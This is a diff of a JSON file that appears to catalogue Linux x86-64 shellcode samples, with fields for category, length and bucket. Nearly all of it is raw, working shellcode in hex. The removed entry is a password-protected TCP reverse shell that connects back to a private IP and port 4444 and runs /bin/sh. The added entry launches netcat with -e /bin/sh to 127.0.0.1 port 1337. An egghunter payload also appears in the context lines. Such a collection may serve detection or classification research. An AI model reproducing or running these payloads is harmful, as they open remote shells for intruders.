@@ -77,17 +77,6 @@
     "doc_ratio": 0.831
   },
   {
-    "path": "Linux/x86-64/TCP_reverse_shell_with_password.c",
-    "os": "linux",
-    "arch": "x86_64",
-    "claimed_effect": "TCP_reverse_shell_with_password.c",
-    "category": "reverse_shell",
-    "length": 138,
-    "bytes": "6a29586a025f6a015e990f054897c74424fcc0a8010966c74424fa115cc64424f8024883ec086a2a584889e66a105a0f056a035e48ffce6a21580f0575f64889c799884424ff4883ec0152488d7424f080c2100f0548b8646f6f6d6564726157488d3e48af74056a3c580f055f4831c048bb2f62696e2f2f7368534889e7504889e2574889e6043b0f05",
-    "bucket": "hex",
-    "doc_ratio": 0.687
-  },
-  {
     "path": "Linux/x86-64/access()_Egghunter.c",
     "os": "linux",
     "arch": "x86_64",
@@ -97,6 +86,17 @@
     "bytes": "eb094831ff48f7e7575ec3554889e5e8eeffffff04294080c702ffc60f0550e8deffffff0431488b3c245681c6030105396681ee0101564889e680c2100f05e8beffffff0432488b7df80f05e8b1ffffff042b488b7df84889e680c218524889e20f054989c0e897ffffff4c89c74080ec184889e680c2180f0548b870417a7a573072644889e748af75424831c04c89c74831f64080c60204210f054831c0042148ffce75f40f05e855ffffff50043b49b82f2f62696e2f736841504889e7524889e2574889e64889ec5d0f054831c0043c0f05",
     "bucket": "hex",
     "doc_ratio": 0.242
+  },
+  {
+    "path": "Linux/x86-64/connect_back_shell_with_netcat.c",
+    "os": "linux",
+    "arch": "x86_64",
+    "claimed_effect": "connect_back_shell_with_netcat.c",
+    "category": "reverse_shell",
+    "length": 109,
+    "bytes": "4831d248bfff2f62696e2f6e6348c1ef08574889e748b9ff2f62696e2f736848c1e908514889e148bbffffffffffff2d6548c1eb30534889e349baffffffff3133333749c1ea2041524989e2eb11415952515341524151574889e6b03b0f05e8eaffffff3132372e302e302e31",
+    "bucket": "asm",
+    "doc_ratio": 0.555
   },
   {
     "path": "Linux/x86-64/sethostname()_&_killall.c",
